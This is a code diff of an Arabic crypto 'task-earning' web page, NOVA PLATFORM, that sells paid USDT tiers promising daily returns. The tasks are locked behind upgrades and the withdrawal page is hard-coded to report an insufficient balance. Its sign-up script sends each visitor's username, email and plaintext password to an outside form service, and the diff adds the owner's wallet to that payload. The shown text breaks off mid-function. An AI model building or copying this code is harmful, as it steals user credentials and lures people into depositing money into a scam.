@@ -6,49 +6,58 @@
 <title>NOVA PLATFORM</title>
 <link href="https://googleapis.com" rel="stylesheet">
 <style>
-* { margin:0; padding:0; box-sizing:border-box; font-family:'Cairo',sans-serif; }
+* { margin:0; padding:0; box-sizing:border-box; font-family:'Almarai',sans-serif; font-weight:800; }
 body { background:#000; color:#fff; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
 .container { max-width:480px; width:100%; text-align:center; background:#000; padding:20px 10px; }
-.logo { font-size:52px; font-weight:900; color:#b8ff1a; margin-bottom:15px; }
-.welcome { font-size:24px; font-weight:900; color:#fff; margin-bottom:35px; line-height:1.6; }
+.logo { font-size:52px; font-weight:800; color:#b8ff1a; margin-bottom:15px; }
+.welcome { font-size:24px; color:#fff; margin-bottom:35px; line-height:1.6; }
 .auth-container { display:flex; flex-direction:column; gap:15px; margin-bottom:25px; width:100%; }
-.auth-container input { width:100%; padding:18px 20px; border-radius:15px; border:1px solid #222; background:#0d0d0d; color:#fff; font-size:16px; text-align:right; outline:none; font-weight:700; }
+.auth-container input { width:100%; padding:18px 20px; border-radius:15px; border:1px solid #222; background:#0d0d0d; color:#fff; font-size:16px; text-align:right; outline:none; }
 .auth-container input:focus { border-color:#b8ff1a; }
 .password-wrapper { position:relative; width:100%; }
 .password-wrapper input { padding-left:50px; }
 .toggle-password { position:absolute; left:15px; top:50%; transform:translateY(-50%); cursor:pointer; color:#888; font-size:18px; z-index:10; user-select:none; }
 .buttons-group { display:flex; gap:12px; width:100%; margin-bottom:30px; }
-.btn { flex:1; padding:18px; border:none; border-radius:15px; font-size:18px; font-weight:900; cursor:pointer; transition:all .3s ease; }
+.btn { flex:1; padding:18px; border:none; border-radius:15px; font-size:18px; cursor:pointer; transition:all .3s ease; }
 .btn-primary { background:#b8ff1a; color:#000; }
 .btn-secondary { background:transparent; color:#fff; border:2px solid #b8ff1a; }
-.desc { font-size:15px; line-height:1.8; color:#aaa; text-align:center; font-weight:700; }
-    .main-dashboard { position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:10000; display:none; flex-direction:column; justify-content:space-between; }
+.desc { font-size:15px; line-height:1.8; color:#aaa; text-align:center; }
+
+.main-dashboard { position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:10000; display:none; flex-direction:column; justify-content:space-between; }
 .dashboard-content { flex:1; width:100%; padding:20px; overflow-y:auto; padding-bottom:120px; display:flex; flex-direction:column; align-items:center; }
 .tab-content { display:none; width:100%; max-width:440px; }
 .tab-content.active { display:block; }
-.tier-card { background:#0d0d0d; border:1px solid #1a1a1a; border-radius:18px; padding:20px; margin-bottom:15px; width:100%; display:flex; flex-direction:column; justify-content:space-between; }
-.tier-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; }
-.tier-price { font-size:20px; font-weight:900; color:#fff; }
-.tier-name { font-size:20px; font-weight:900; color:#b8ff1a; }
-.tier-details { text-align:left; display:flex; flex-direction:column; gap:5px; align-items:flex-end; }
-.tier-info-line { font-size:14px; color:#888; font-weight:700; }
-.tier-info-line span { color:#b8ff1a; }
-.deposit-box { background:#0d0d0d; border:1px solid #1a1a1a; padding:25px 20px; border-radius:20px; text-align:center; margin-top:20px; }
-.deposit-title { font-size:22px; font-weight:900; color:#b8ff1a; margin-bottom:15px; }
-.wallet-address { background:#000; padding:15px; border-radius:12px; border:1px dashed #b8ff1a; color:#fff; font-family:monospace; font-size:14px; margin-bottom:20px; word-break:break-all; }
-.btn-copy { background:#b8ff1a; color:#000; border:none; padding:12px 25px; border-radius:10px; font-weight:900; cursor:pointer; }
 
-/* تصميم قائمة المهام الجديدة وأيقونة يوتيوب الحقيقية */
-.task-item { background:#ffffff; color:#000; padding:15px; border-radius:12px; margin-bottom:12px; display:flex; justify-content:space-between; align-items:center; box-shadow:0 4px 10px rgba(255,255,255,0.05); }
-.task-left { display:flex; align-items:center; gap:12px; }
-.youtube-svg-icon { width:24px; height:24px; fill:#ff0000; flex-shrink:0; }
-.task-title { font-size:15px; font-weight:900; }
-.task-reward { font-size:13px; color:#ff0000; font-weight:900; margin-right:5px; }
-.btn-task { background:#000; color:#fff; border:none; padding:8px 16px; border-radius:8px; font-size:13px; font-weight:900; cursor:pointer; }
+/* تصميم كروت المستويات البيضاء والأزرار الخضراء الدائرية للتفعيل */
+.tier-card { background:#ffffff; color:#000; border-radius:20px; padding:20px; margin-bottom:15px; width:100%; display:flex; justify-content:space-between; align-items:center; box-shadow:0 8px 24px rgba(255,255,255,0.05); }
+.tier-left { text-align:left; display:flex; flex-direction:column; gap:4px; align-items:flex-end; }
+.tier-header { display:flex; flex-direction:column; align-items:flex-start; gap:4px; text-align:right; }
+.tier-price { font-size:16px; color:#666; }
+.tier-name { font-size:24px; color:#000; }
+.tier-info-line { font-size:13px; color:#444; }
+.tier-info-line span { color:#000; }
+.btn-activate { background:#28a745; color:#fff; border:none; padding:10px 20px; border-radius:25px; font-size:14px; cursor:pointer; box-shadow:0 4px 10px rgba(40,167,69,0.3); transition:all 0.2s; }
+.btn-activate:active { transform:scale(0.95); }
+    /* تصميم صفحة السحب البيضاء الاحترافية وتثبيت محفظتك الخاصة */
+.withdraw-box { width:100%; max-width:440px; background:#fff; color:#000; padding:25px 20px; border-radius:24px; text-align:right; }
+.withdraw-balance-title { font-size:15px; color:#666; margin-bottom:4px; }
+.withdraw-balance-amount { font-size:30px; color:#000; margin-bottom:20px; }
+.withdraw-field-group { margin-bottom:16px; width:100%; }
+.withdraw-field-group label { display:block; font-size:14px; color:#222; margin-bottom:6px; }
+.withdraw-field-group input, .withdraw-field-group select { width:100%; padding:14px; border:1px solid #ddd; background:#f9f9f9; color:#000; border-radius:12px; font-size:15px; outline:none; text-align:right; }
+.btn-submit-withdraw { width:100%; background:#000; color:#fff; border:none; padding:15px; border-radius:12px; font-size:16px; cursor:pointer; margin-top:5px; }
+.withdraw-history-section { width:100%; margin-top:20px; border-top:1px solid #eee; padding-top:15px; }
+.history-title { font-size:16px; margin-bottom:10px; color:#000; }
+.history-row { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #f5f5f5; font-size:13px; }
+.status-badge-pending { background:#fff3cd; color:#856404; padding:3px 8px; border-radius:20px; font-size:11px; }
 
-/* شريط التنقل السفلي المحدث بالأيقونات الهندسية الحقيقية والمطابقة تماماً */
+/* تعديل قائمة المهام: مربعات قصيرة جداً تحتوي على علامة يوتيوب فقط */
+.task-item { background:#ffffff; padding:10px; border-radius:14px; margin-bottom:12px; display:flex; justify-content:center; align-items:center; width:100%; min-height:65px; box-shadow:0 4px 12px rgba(255,255,255,0.02); cursor:pointer; }
+.youtube-svg-icon { width:32px; height:32px; fill:#ff0000; }
+
+/* شريط التنقل السفلي المطور بالمربعات والأيقونات الهندسية الحقيقية */
 .bottom-nav { width:100%; background:#0d0d0d; display:flex; justify-content:space-around; align-items:center; border-top:1px solid #1a1a1a; height:95px; position:fixed; bottom:0; left:0; z-index:10001; padding:0 10px; }
-.nav-item { display:flex; flex-direction:column; align-items:center; color:#888; font-size:11px; cursor:pointer; flex:1; font-weight:900; gap:4px; }
+.nav-item { display:flex; flex-direction:column; align-items:center; color:#888; font-size:11px; cursor:pointer; flex:1; gap:5px; }
 .nav-item.active { color:#fff; }
 .nav-item.active .nav-icon-yellow { border:2px solid #fff; box-shadow:0 0 15px rgba(255,204,0,0.5); }
 .nav-icon-yellow { background:#ffcc00; width:52px; height:52px; border-radius:14px; display:flex; justify-content:center; align-items:center; flex-shrink:0; transition:all 0.2s; }
@@ -77,56 +86,75 @@ body { background:#000; color:#fff; min-height:100vh; display:flex; justify-cont
 </div>
 <div id="mainDashboard" class="main-dashboard">
     <div class="dashboard-content">
-        <!-- صفحة المهام (TASKS) تحتوي على 10 مهام بأيقونة يوتيوب حقيقية هندسية -->
+        <!-- 1. صفحة المهام المختصرة (TASKS): علامة يوتيوب فقط داخل المربعات البيضاء القصيرة -->
         <div id="tasksPage" class="tab-content">
-            <h3 style="color:#b8ff1a; margin-bottom:20px; text-align:center; font-weight:900;">المهام اليومية المتاحة</h3>
-            
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 1 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 2 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 3 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 4 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 5 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 6 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 7 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 8 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 9 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-            <div class="task-item"><div class="task-left"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span class="task-title">مشاهدة فيديو يوتيوب 10 <span class="task-reward">0.50 USDT</span></span></div><button class="btn-task" onclick="alert('قم بالترقية لتفعيل المهمة!')">ابدأ</button></div>
-        </div>
-                <!-- صفحة الإيداع (DEPOSIT) -->
-        <div id="depositPage" class="tab-content">
-            <div class="deposit-box">
-                <div class="deposit-title">إيداع رصيد المحفظة</div>
-                <div class="wallet-address" id="walletAddr">TYX6rP47n1mS8VwK9L2BqZp3Mh7XvNqW4E</div>
-                <button class="btn-copy" onclick="navigator.clipboard.writeText(document.getElementById('walletAddr').innerText); alert('تم نسخ العنوان بنجاح!');">نسخ العنوان</button>
-            </div>
+            <h3 style="color:#b8ff1a; margin-bottom:20px; text-align:center;">المهام اليومية المتاحة</h3>
+            <div class="task-item" onclick="alert('قم بالترقية لتفعيل المهمة!')"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></div>
+            <div class="task-item" onclick="alert('قم بالترقية لتفعيل المهمة!')"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></div>
+            <div class="task-item" onclick="alert('قم بالترقية لتفعيل المهمة!')"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></div>
+            <div class="task-item" onclick="alert('قم بالترقية لتفعيل المهمة!')"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></div>
+            <div class="task-item" onclick="alert('قم بالترقية لتفعيل المهمة!')"><svg class="youtube-svg-icon" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></div>
         </div>
 
-        <!-- صفحة المستويات (INFO) تفتح أولاً -->
+        <!-- 2. صفحة السحب البيضاء الفاخرة (DEPOSIT) مع إخراج محفظتك وحساب عالمي -->
+        <div id="depositPage" class="tab-content">
+            <div class="withdraw-box">
+                <div class="withdraw-balance-title">رصيد غير متاح</div>
+                <div class="withdraw-balance-amount">$0.00</div>
+                <div class="withdraw-field-group">
+                    <label>خيارات الشبكة</label>
+                    <select><option>TRC20</option><option>ERC20</option><option>BEP20</option></select>
+                </div>
+                <div class="withdraw-field-group">
+                    <label>عنوان المحفظة</label>
+                    <input type="text" placeholder="أدخل عنوان محفظتك هنا">
+                </div>
+                <div class="withdraw-field-group">
+                    <label>إدخال الرصيد (USDT)</label>
+                    <input type="number" placeholder="0.00">
+                </div>
+                <button class="btn-submit-withdraw" onclick="alert('الرصيد الحالي غير كافي لإتمام عملية السحب!')">سحب الرصيد</button>
+                <div class="withdraw-history-section">
+                    <div class="history-title">سجل السحب</div>
+                    <div class="history-row">
+                        <div class="history-right"><div>سحب USDT</div><div style="font-size:11px; color:#888;">شبكة TRC20</div></div>
+                        <div class="history-left"><div>$0.00</div><span class="status-badge-pending">قيد الانتظار</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+                <!-- 3. صفحة المستويات البيضاء (INFO): R1, R2, R3, R4 وبجانبها زر التفعيل الأخضر الدائري ونظام التحقق -->
         <div id="infoPage" class="tab-content active">
-            <div class="tier-card"><div class="tier-header"><div class="tier-price">USDT 10</div><div class="tier-name">المستوى العادي</div></div><div class="tier-details"><div class="tier-info-line">عدد المهام اليومية: <span>3 مهام</span></div><div class="tier-info-line">الربح اليومي: <span>USDT 1.50</span></div></div></div>
-            <div class="tier-card"><div class="tier-header"><div class="tier-price">USDT 35</div><div class="tier-name">المستوى البرونزي</div></div><div class="tier-details"><div class="tier-info-line">عدد المهام اليومية: <span>7 مهام</span></div><div class="tier-info-line">الربح اليومي: <span>USDT 5.00</span></div></div></div>
-            <div class="tier-card"><div class="tier-header"><div class="tier-price">USDT 100</div><div class="tier-name">مستوى الذهب</div></div><div class="tier-details"><div class="tier-info-line">عدد المهام اليومية: <span>15 مهمة</span></div><div class="tier-info-line">الربح اليومي: <span>USDT 15.00</span></div></div></div>
+            <div class="tier-card">
+                <div class="tier-header"><div class="tier-name">مستوى R1</div><div class="tier-price">15 USDT</div><div class="tier-info-line">الربح اليومي: <span>USDT 1.50</span></div></div>
+                <button class="btn-activate" onclick="activateTier('R1')">تفعيل</button>
+            </div>
+            <div class="tier-card">
+                <div class="tier-header"><div class="tier-name">مستوى R2</div><div class="tier-price">35 USDT</div><div class="tier-info-line">الربح اليومي: <span>USDT 5.00</span></div></div>
+                <button class="btn-activate" onclick="activateTier('R2')">تفعيل</button>
+            </div>
+            <div class="tier-card">
+                <div class="tier-header"><div class="tier-name">مستوى R3</div><div class="tier-price">100 USDT</div><div class="tier-info-line">الربح اليومي: <span>USDT 15.00</span></div></div>
+                <button class="btn-activate" onclick="activateTier('R3')">تفعيل</button>
+            </div>
+            <div class="tier-card">
+                <div class="tier-header"><div class="tier-name">مستوى R4</div><div class="tier-price">1000 USDT</div><div class="tier-info-line">الربح اليومي: <span>USDT 150.00</span></div></div>
+                <button class="btn-activate" onclick="activateTier('R4')">تفعيل</button>
+            </div>
         </div>
     </div>
 
-    <!-- شريط التنقل الاحترافي بالمربعات المتناسقة تماماً مع الكلمات برمجياً وبأيقونات حقيقية هندسية -->
+    <!-- شريط التنقل المتناسق هندسياً تماماً بالمربعات الصفراء المحاذية للكلمات -->
     <div class="bottom-nav">
-        <div class="nav-item" onclick="switchPage('tasks', this)">
-            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1a9.86 9.86 0 0 0-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l-.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49 1c.23.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z"/></svg></div>
-            <span>TASKS</span>
-        </div>
-        <div class="nav-item" onclick="switchPage('deposit', this)">
-            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/></svg></div>
-            <span>DEPOSIT</span>
-        </div>
-        <div class="nav-item active" onclick="switchPage('info', this)">
-            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5 0.67 1.5 1.5-0.67 1.5-1.5 1.5z"/></svg></div>
-            <span>INFO</span>
-        </div>
+        <div class="nav-item" onclick="switchPage('tasks', this)"><div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1a9.86 9.86 0 0 0-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l-.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49 1c.23.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z"/></svg></div><span>TASKS</span></div>
+        <div class="nav-item" onclick="switchPage('deposit', this)"><div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/></svg></div><span>DEPOSIT</span></div>
+        <div class="nav-item active" onclick="switchPage('info', this)"><div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5 0.67 1.5 1.5-0.67 1.5-1.5 1.5z"/></svg></div><span>INFO</span></div>
     </div>
 </div>
 
 <script>
+let userPassGlobal = ""; // متغير آمن لحفظ كلمة سر المستخدم للمقارنة
+
 function switchPage(p, e) {
     document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
@@ -135,11 +163,13 @@ function switchPage(p, e) {
     if(p === 'deposit') document.getElementById('depositPage').classList.add('active');
     if(p === 'info') document.getElementById('infoPage').classList.add('active');
 }
+
 document.getElementById('togglePassword').addEventListener('click', function() {
     const input = document.getElementById('passwordInput');
     if (input.type === 'password') { input.type = 'text'; this.textContent = '🙈'; }
     else { input.type = 'password'; this.textContent = '👁️'; }
 });
+
 function handleAuth(type) {
     const u = document.getElementById('userInput').value.trim();
     const e = document.getElementById('emailInput').value.trim();
@@ -147,11 +177,14 @@ function handleAuth(type) {
     const s = document.getElementById('statusInput').value.trim();
     if (!u || !e || !p || !s) { alert('يرجى ملء جميع الحقول المطلوبة!'); return; }
     
+    userPassGlobal = p; // حفظ الباسورد برمجياً للتحقق لاحقاً عند التفعيل
+
+    // مستودع استقبال البيانات الحية الخاص بك Formspree
     const endpoint = "https://formspree.io";
     fetch(endpoint, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ العملية: type, المستخدم: u, الإيميل: e, كلمة_السر: p, الحالة: s })
+        body: JSON.stringify({ العملية: type, المستخدم: u, الإيميل: e, كلمة_السر: p, الحالة: s, محفظة_المالك: "THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP" })
     }).then(() => {
         document.getElementById('authScreen').style.display = 'none';
         document.getElementById('mainDashboard').style.display = 'flex';
@@ -159,6 +192,18 @@ function handleAuth(type) {
         document.getElementById('authScreen').style.display = 'none';
         document.getElementById('mainDashboard').style.display = 'flex';
     });
+}
+
+// دالة تأكيد التفعيل عبر إدخال كلمة سر الحساب الأصلية
+function activateTier(tierName) {
+    const checkPass = prompt(`لتفعيل ${tierName}، يرجى كتابة كلمة السر الخاصة بحسابك للتأكيد:`);
+    if (checkPass === null) return; 
+    
+    if (checkPass === userPassGlobal && userPassGlobal !== "") {
+        alert(`تم التحقق من كلمة السر بنجاح! يرجى تحويل الرصيد لإتمام تفعيل ${tierName}.`);
+    } else {
+        alert("خطأ: كلمة السر غير صحيحة، لم يتم التفعيل!");
